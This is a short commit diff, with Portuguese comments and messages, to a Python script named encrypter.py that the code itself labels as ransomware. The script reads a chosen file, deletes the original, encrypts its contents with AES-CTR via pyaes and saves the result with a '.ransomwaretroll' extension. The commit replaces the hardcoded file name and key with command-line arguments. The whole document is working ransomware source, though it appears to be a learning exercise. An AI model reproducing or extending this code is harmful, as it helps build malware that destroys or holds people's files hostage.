Feat: Flexibilização para a criação da chave e escolha do arquivo a ser criptografado

+++ encrypter.py
@@ -1,23 +1,24 @@
 import os
 import pyaes
+import sys
 
-## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
+if len(sys.argv)<= 2:
+    print("Por favor, insira o nome do arquivo a ser criptografado e sua chave. Exemplo: python3 encrypter.py nome-do-arquivo chave-de-16-24-ou-32-bytes")
+    sys.exit()
+
+
+file_name = sys.argv[1]
+key = sys.argv[2].encode('utf-8')
 file = open(file_name, "rb")
 file_data = file.read()
 file.close()
 
-## remover o arquivo
 os.remove(file_name)
 
-## chave de criptografia
-key = b"testeransomwares"
 aes = pyaes.AESModeOfOperationCTR(key)
 
-## criptografar o arquivo
 crypto_data = aes.encrypt(file_data)
 
-## salvar o arquivo criptografado
 new_file = file_name + ".ransomwaretroll"
 new_file = open(f'{new_file}','wb')
 new_file.write(crypto_data)
